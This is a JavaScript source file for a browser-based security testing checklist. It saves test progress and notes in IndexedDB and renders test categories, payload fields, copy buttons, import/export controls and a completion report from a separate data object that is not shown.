// ***** IndexedDB persistence (works in file://) *****
const DB_NAME     = 'SecurityChecklistDB';
const DB_VERSION  = 1;
const STORE_NAME  = 'progress';

let db;

function openDB () {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(DB_NAME, DB_VERSION);
    req.onerror       = () => reject(req.error);
    req.onsuccess     = (e) => { db = e.target.result; resolve(db); };
    req.onupgradeneeded = (e) => {
      db = e.target.result;
      db.createObjectStore(STORE_NAME, { keyPath: 'id' });
    };
  });
}

function saveProgress (obj) {
  if (!db) return;
  const tx = db.transaction(STORE_NAME, 'readwrite');
  tx.objectStore(STORE_NAME).put({ id: 'checklist', data: obj });
}

function loadProgress () {
  if (!db) return Promise.resolve(null);
  return new Promise((res) => {
    const tx  = db.transaction(STORE_NAME);
    const req = tx.objectStore(STORE_NAME).get('checklist');
    req.onsuccess = () => res(req.result ? req.result.data : null);
    req.onerror   = () => res(null);
  });
}

function clearProgress () {
  if (!db) return;
  const tx = db.transaction(STORE_NAME, 'readwrite');
  tx.objectStore(STORE_NAME).clear();
}
// ****************************************************

// Application state
let appState = {
  completedTests: new Set(),
  testNotes: {},
  currentFilter: 'all',
  searchQuery: '',
  expandedCategories: new Set(),
  expandedTests: new Set()
};

// DOM elements
let elements = {};

// Initialize application
document.addEventListener('DOMContentLoaded', async function() {
  await openDB();  // Open IndexedDB first
  
  initializeElements();
  const savedState = await loadProgress();
  if (savedState) {
    appState = savedState;
  }
  renderCategories();
  renderTestCategories();
  updateStats();
  attachEventListeners();
  
  // Add Reset button
  const resetBtn = document.createElement('button');
  resetBtn.textContent = 'Reset Progress';
  resetBtn.className = 'reset-btn';  // Add your CSS class if needed
  resetBtn.addEventListener('click', () => {
    if (confirm('Clear ALL saved progress?')) {
      clearProgress();  // Wipe IndexedDB
      appState.completedTests.clear();  // Reset in-memory state
      appState.testNotes = {};
      renderTestCategories();  // Re-render to uncheck all
      updateStats();
    }
  });
  // Append to header (adjust selector to match your index.html)
  document.querySelector('.header-content').appendChild(resetBtn);
  
  // Add Import/Export buttons
  const importInput = document.createElement('input');
  importInput.type = 'file';
  importInput.accept = 'application/json';
  importInput.style.display = 'none';
  importInput.addEventListener('change', importProgressFromFile);
  document.body.appendChild(importInput);

  const exportBtn = document.createElement('button');
  exportBtn.textContent = 'Export Progress';
  exportBtn.addEventListener('click', exportCurrentProgress);

  const importBtn = document.createElement('button');
  importBtn.textContent = 'Import Progress';
  importBtn.addEventListener('click', () => { importInput.click(); });

  const header = document.querySelector('.header-content');
  if(header) {
    header.appendChild(exportBtn);
    header.appendChild(importBtn);
  }
});

// Prompt to export before closing the page
window.addEventListener('beforeunload', (e) => {
  if (appState.completedTests.size > 0) {  // Only prompt if there's progress
    const confirmationMessage = 'Save your progress before closing?';
    e.returnValue = confirmationMessage;  // Standard way to show prompt
    exportCurrentProgress();  // Auto-trigger export
    return confirmationMessage;
  }
});

// Export current progress as JSON file
function exportCurrentProgress() {
  const obj = {
    completed: Array.from(appState.completedTests),
    notes: appState.testNotes
  };
  const jsonStr = JSON.stringify(obj);
  const blob = new Blob([jsonStr], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'checklist-progress.json';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

// Import progress from uploaded file
function importProgressFromFile(event) {
  const file = event.target.files[0];
  if(!file) return;
  const reader = new FileReader();
  reader.onload = function(e) {
    try {
      const imported = JSON.parse(e.target.result);
      if(imported.completed && Array.isArray(imported.completed)) {
        appState.completedTests = new Set(imported.completed);
      } else {
        appState.completedTests = new Set();
      }
      if(imported.notes && typeof imported.notes === 'object') {
        appState.testNotes = imported.notes;
      } else {
        appState.testNotes = {};
      }
      renderTestCategories();
      updateStats();
      saveProgress(appState);
      alert('✅ Progress imported successfully!');
    } catch(err) {
      alert('❌ Failed to import progress: invalid file format');
    }
  };
  reader.readAsText(file);
}

function initializeElements() {
  elements = {
    totalTests: document.getElementById('totalTests'),
    completedTests: document.getElementById('completedTests'),
    pendingTests: document.getElementById('pendingTests'),
    progressFill: document.getElementById('progressFill'),
    progressText: document.getElementById('progressText'),
    searchInput: document.getElementById('searchInput'),
    categoryNav: document.getElementById('categoryNav'),
    testCategories: document.getElementById('testCategories'),
    generateReport: document.getElementById('generateReport'),
    reportModal: document.getElementById('reportModal'),
    reportContent: document.getElementById('reportContent'),
    closeModal: document.getElementById('closeModal'),
    copyNotification: document.getElementById('copyNotification'),
    expandAllBtn: document.getElementById('expandAllBtn'),
    collapseAllBtn: document.getElementById('collapseAllBtn')
  };
}

function renderCategories() {
  const nav = elements.categoryNav;
  nav.innerHTML = '';
  
  Object.keys(securityTestData).forEach(category => {
    const link = document.createElement('a');
    link.href = '#';
    link.className = 'category-link';
    link.textContent = category;
    link.dataset.category = category;
    
    link.addEventListener('click', (e) => {
      e.preventDefault();
      scrollToCategory(category);
      
      // Update active state
      nav.querySelectorAll('.category-link').forEach(l => l.classList.remove('active'));
      link.classList.add('active');
    });
    
    nav.appendChild(link);
  });
}

function renderTestCategories() {
  const container = elements.testCategories;
  container.innerHTML = '';
  
  Object.entries(securityTestData).forEach(([categoryName, tests]) => {
    if (shouldShowCategory(categoryName, tests)) {
      const categoryElement = createCategoryElement(categoryName, tests);
      if (categoryElement) {
        container.appendChild(categoryElement);
      }
    }
  });
  
  // Re-attach event listeners after rendering
  attachCategoryEventListeners();
}

function shouldShowCategory(categoryName, tests) {
  if (appState.searchQuery) {
    return tests.some(test => matchesSearch(test));
  }
  
  if (appState.currentFilter === 'all') return true;
  if (appState.currentFilter === 'completed') {
    return tests.some(test => appState.completedTests.has(test.id));
  }
  if (appState.currentFilter === 'pending') {
    return tests.some(test => !appState.completedTests.has(test.id));
  }
  if (appState.currentFilter === 'critical') {
    return tests.some(test => test.critical);
  }
  
  return true;
}

function matchesSearch(test) {
  const query = appState.searchQuery.toLowerCase();
  return test.name.toLowerCase().includes(query) ||
         test.id.toLowerCase().includes(query) ||
         (test.description && test.description.toLowerCase().includes(query)) ||
         (test.payloads && test.payloads.some(payload => payload.toLowerCase().includes(query)));
}

function createCategoryElement(categoryName, tests) {
  const filteredTests = tests.filter(test => {
    if (appState.searchQuery && !matchesSearch(test)) return false;
    
    if (appState.currentFilter === 'completed') {
      return appState.completedTests.has(test.id);
    }
    if (appState.currentFilter === 'pending') {
      return !appState.completedTests.has(test.id);
    }
    if (appState.currentFilter === 'critical') {
      return test.critical;
    }
    
    return true;
  });
  
  if (filteredTests.length === 0) return null;
  
  const section = document.createElement('div');
  section.className = 'category-section';
  section.dataset.category = categoryName;
  
  if (appState.expandedCategories.has(categoryName)) {
    section.classList.add('expanded');
  }
  
  const completed = filteredTests.filter(test => appState.completedTests.has(test.id)).length;
  const total = filteredTests.length;
  
  section.innerHTML = `
    <div class="category-header" data-category="${categoryName}">
      <h3 class="category-title">${categoryName}</h3>
      <div class="category-stats">${completed}/${total} completed</div>
      <span class="category-expand">▼</span>
    </div>
    <div class="category-content">
      <div class="test-list">
        ${filteredTests.map(test => createTestElement(test)).join('')}
      </div>
    </div>
  `;
  
  return section;
}

function createTestElement(test) {
  const isCompleted = appState.completedTests.has(test.id);
  const isExpanded = appState.expandedTests.has(test.id);
  const notes = appState.testNotes[test.id] || '';
  
  const statusClass = isCompleted ? 'completed' : 'not-started';
  const statusText = isCompleted ? 'Completed' : 'Not Started';
  const criticalBadge = test.critical ? '<span class="status status--error">Critical</span>' : '';
  
  return `
    <div class="test-item ${isExpanded ? 'expanded' : ''}" data-test-id="${test.id}">
      <div class="test-header" data-test-id="${test.id}">
        <input type="checkbox" class="test-checkbox" ${isCompleted ? 'checked' : ''} data-test-id="${test.id}">
        <div class="test-info">
          <div class="test-id">${test.id}</div>
          <div class="test-name">${test.name}</div>
          <div class="test-description">${test.description || ''}</div>
        </div>
        <div class="test-status">
          <div class="status status--${statusClass}">${statusText}</div>
          ${criticalBadge}
        </div>
        <span class="test-expand" data-test-id="${test.id}">▼</span>
      </div>
      <div class="test-details">
        <div class="test-details-content">
          ${createTestDetailsContent(test)}
          <div class="notes-section">
            <div class="test-field">
              <label class="test-field-label">Testing Notes</label>
              <textarea class="notes-textarea" data-test-id="${test.id}" placeholder="Add your testing notes here...">${notes}</textarea>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;
}

function createTestDetailsContent(test) {
  let content = '';
  
  if (test.page) {
    content += `
      <div class="test-field">
        <label class="test-field-label">Page/Location</label>
        <div class="test-field-content">${test.page}</div>
      </div>
    `;
  }
  
  if (test.howToTest) {
    content += `
      <div class="test-field">
        <label class="test-field-label">How to Test</label>
        <div class="test-field-content">${test.howToTest}</div>
      </div>
    `;
  }
  
  if (test.payloads && test.payloads.length > 0) {
    content += `
      <div class="test-field">
        <label class="test-field-label">Test Payloads</label>
        <div class="payload-container">
          ${test.payloads.map(payload => createCodeBlock(payload)).join('')}
        </div>
      </div>
    `;
  }
  
  if (test.commands && test.commands.length > 0) {
    content += `
      <div class="test-field">
        <label class="test-field-label">Commands</label>
        <div class="payload-container">
          ${test.commands.map(command => createCodeBlock(command)).join('')}
        </div>
      </div>
    `;
  }
  
  if (test.tools) {
    content += `
      <div class="test-field">
        <label class="test-field-label">Tools</label>
        <div class="test-field-content">${test.tools}</div>
      </div>
    `;
  }
  
  if (test.recommendation) {
    content += `
      <div class="test-field">
        <label class="test-field-label">Recommendation</label>
        <div class="test-field-content">${test.recommendation}</div>
      </div>
    `;
  }
  
  if (test.note) {
    content += `
      <div class="test-field">
        <label class="test-field-label">Note</label>
        <div class="test-field-content">${test.note}</div>
      </div>
    `;
  }
  
  return content;
}

function createCodeBlock(code) {
  const uniqueId = Math.random().toString(36).substr(2, 9);
  return `
    <div class="code-block">
      <div class="code-content">${escapeHtml(code)}</div>
      <button class="copy-btn" data-code="${escapeHtml(code)}" data-id="${uniqueId}">
        📋 Copy
      </button>
    </div>
  `;
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function attachEventListeners() {
  // Search functionality
  elements.searchInput.addEventListener('input', (e) => {
    appState.searchQuery = e.target.value;
    renderTestCategories();
    saveProgress(appState);
  });
  
  // Filter buttons (assuming you have .filter-btn elements in HTML)
  document.querySelectorAll('.filter-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
      e.target.classList.add('active');
      
      appState.currentFilter = e.target.dataset.filter;
      renderTestCategories();
      saveProgress(appState);
    });
  });
  
  // Expand/Collapse all buttons
  elements.expandAllBtn.addEventListener('click', () => {
    document.querySelectorAll('.category-section').forEach(section => {
      section.classList.add('expanded');
      const categoryName = section.dataset.category;
      appState.expandedCategories.add(categoryName);
    });
    saveProgress(appState);
  });
  
  elements.collapseAllBtn.addEventListener('click', () => {
    document.querySelectorAll('.category-section').forEach(section => {
      section.classList.remove('expanded');
      const categoryName = section.dataset.category;
      appState.expandedCategories.delete(categoryName);
    });
    saveProgress(appState);
  });
  
  // Report modal
  elements.generateReport.addEventListener('click', generateReport);
  elements.closeModal.addEventListener('click', closeModal);
  elements.reportModal.addEventListener('click', (e) => {
    if (e.target === elements.reportModal) {
      closeModal();
    }
  });
}

function attachCategoryEventListeners() {
  // Category header clicks
  document.querySelectorAll('.category-header').forEach(header => {
    header.addEventListener('click', (e) => {
      e.preventDefault();
      const categoryName = e.currentTarget.dataset.category;
      const section = e.currentTarget.closest('.category-section');
      
      section.classList.toggle('expanded');
      
      if (section.classList.contains('expanded')) {
        appState.expandedCategories.add(categoryName);
      } else {
        appState.expandedCategories.delete(categoryName);
      }
      saveProgress(appState);
    });
  });
  
  // Test item clicks
  document.querySelectorAll('.test-header').forEach(header => {
    header.addEventListener('click', (e) => {
      // Don't expand if clicking on checkbox
      if (e.target.classList.contains('test-checkbox')) {
        return;
      }
      
      e.preventDefault();
      const testId = e.currentTarget.dataset.testId;
      const testItem = e.currentTarget.closest('.test-item');
      
      testItem.classList.toggle('expanded');
      
      if (testItem.classList.contains('expanded')) {
        appState.expandedTests.add(testId);
      } else {
        appState.expandedTests.delete(testId);
      }
      saveProgress(appState);
    });
  });
  
  // Test expand buttons
  document.querySelectorAll('.test-expand').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      const testId = e.target.dataset.testId;
      const testItem = e.target.closest('.test-item');
      
      testItem.classList.toggle('expanded');
      
      if (testItem.classList.contains('expanded')) {
        appState.expandedTests.add(testId);
      } else {
        appState.expandedTests.delete(testId);
      }
      saveProgress(appState);
    });
  });
  
  // Checkbox changes
  document.querySelectorAll('.test-checkbox').forEach(checkbox => {
    checkbox.addEventListener('change', (e) => {
      const testId = e.target.dataset.testId;
      
      if (e.target.checked) {
        appState.completedTests.add(testId);
      } else {
        appState.completedTests.delete(testId);
      }
      
      updateTestStatus(testId);
      updateStats();
      saveProgress(appState);
    });
  });
  
  // Copy buttons
  document.querySelectorAll('.copy-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      const code = e.target.dataset.code;
      copyToClipboard(code, e.target);
    });
  });
  
  // Notes textarea
  document.querySelectorAll('.notes-textarea').forEach(textarea => {
    textarea.addEventListener('input', (e) => {
      const testId = e.target.dataset.testId;
      appState.testNotes[testId] = e.target.value;
      saveProgress(appState);
    });
  });
}

function updateTestStatus(testId) {
  const testItem = document.querySelector(`.test-item[data-test-id="${testId}"]`);
  if (testItem) {
    const isCompleted = appState.completedTests.has(testId);
    const statusElement = testItem.querySelector('.status:not(.status--error)');
    
    if (statusElement) {
      statusElement.className = `status status--${isCompleted ? 'completed' : 'not-started'}`;
      statusElement.textContent = isCompleted ? 'Completed' : 'Not Started';
    }
  }
  
  // Update category stats
  renderTestCategories();
}

function updateStats() {
  const totalTests = getTotalTestCount();
  const completed = appState.completedTests.size;
  const pending = totalTests - completed;
  const percentage = totalTests > 0 ? Math.round((completed / totalTests) * 100) : 0;
  
  elements.totalTests.textContent = totalTests;
  elements.completedTests.textContent = completed;
  elements.pendingTests.textContent = pending;
  elements.progressFill.style.width = `${percentage}%`;
  elements.progressText.textContent = `${percentage}%`;
}

function getTotalTestCount() {
  return Object.values(securityTestData).reduce((total, tests) => total + tests.length, 0);
}

function copyToClipboard(text, buttonElement) {
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).then(() => {
      showCopySuccess(buttonElement);
      showCopyNotification();
    }).catch(err => {
      console.error('Could not copy text: ', err);
      fallbackCopyTextToClipboard(text, buttonElement);
    });
  } else {
    fallbackCopyTextToClipboard(text, buttonElement);
  }
}

function fallbackCopyTextToClipboard(text, buttonElement) {
  const textArea = document.createElement("textarea");
  textArea.value = text;
  
  // Avoid scrolling to bottom
  textArea.style.top = "0";
  textArea.style.left = "0";
  textArea.style.position = "fixed";
  
  document.body.appendChild(textArea);
  textArea.focus();
  textArea.select();
  
  try {
    const successful = document.execCommand('copy');
    if (successful) {
      showCopySuccess(buttonElement);
      showCopyNotification();
    }
  } catch (err) {
    console.error('Fallback: Oops, unable to copy', err);
  }
  
  document.body.removeChild(textArea);
}

function showCopySuccess(buttonElement) {
  const originalText = buttonElement.textContent;
  buttonElement.textContent = '✅ Copied!';
  buttonElement.classList.add('copied');
  
  setTimeout(() => {
    buttonElement.textContent = originalText;
    buttonElement.classList.remove('copied');
  }, 2000);
}

function showCopyNotification() {
  elements.copyNotification.classList.remove('hidden');
  
  setTimeout(() => {
    elements.copyNotification.classList.add('hidden');
  }, 3000);
}

function scrollToCategory(category) {
  const categoryElement = document.querySelector(`[data-category="${category}"]`);
  if (categoryElement) {
    categoryElement.scrollIntoView({ behavior: 'smooth' });
  }
}

function generateReport() {
  const totalTests = getTotalTestCount();
  const completed = appState.completedTests.size;
  const pending = totalTests - completed;
  const percentage = totalTests > 0 ? Math.round((completed / totalTests) * 100) : 0;
  
  let reportHTML = `
    <div class="report-summary">
      <h4>Test Completion Summary</h4>
      <div class="report-stats">
        <div class="report-stat">
          <span class="report-stat-value">${totalTests}</span>
          <span class="report-stat-label">Total Tests</span>
        </div>
        <div class="report-stat">
          <span class="report-stat-value">${completed}</span>
          <span class="report-stat-label">Completed</span>
        </div>
        <div class="report-stat">
          <span class="report-stat-value">${pending}</span>
          <span class="report-stat-label">Pending</span>
        </div>
        <div class="report-stat">
          <span class="report-stat-value">${percentage}%</span>
          <span class="report-stat-label">Progress</span>
        </div>
      </div>
    </div>
    
    <div class="report-categories">
      <h4>Category Breakdown</h4>
  `;
  
  Object.entries(securityTestData).forEach(([categoryName, tests]) => {
    const categoryCompleted = tests.filter(test => appState.completedTests.has(test.id)).length;
    const categoryTotal = tests.length;
    const criticalMissing = tests.filter(test => test.critical && !appState.completedTests.has(test.id));
    
    const isCriticalMissing = criticalMissing.length > 0;
    
    reportHTML += `
      <div class="report-category ${isCriticalMissing ? 'critical-missing' : ''}">
        <div class="report-category-header">
          <span class="report-category-name">${categoryName}</span>
          <span>${categoryCompleted}/${categoryTotal} completed</span>
        </div>
    `;
    
    if (isCriticalMissing) {
      reportHTML += `
        <div class="critical-tests">
          <strong>⚠️ Critical Missing Tests:</strong>
          <ul>
            ${criticalMissing.map(test => `<li>${test.id}: ${test.name}</li>`).join('')}
          </ul>
        </div>
      `;
    }
    
    reportHTML += `</div>`;
  });
  
  reportHTML += `</div>`;
  
  elements.reportContent.innerHTML = reportHTML;
  elements.reportModal.classList.remove('hidden');
}

function closeModal() {
  elements.reportModal.classList.add('hidden');
}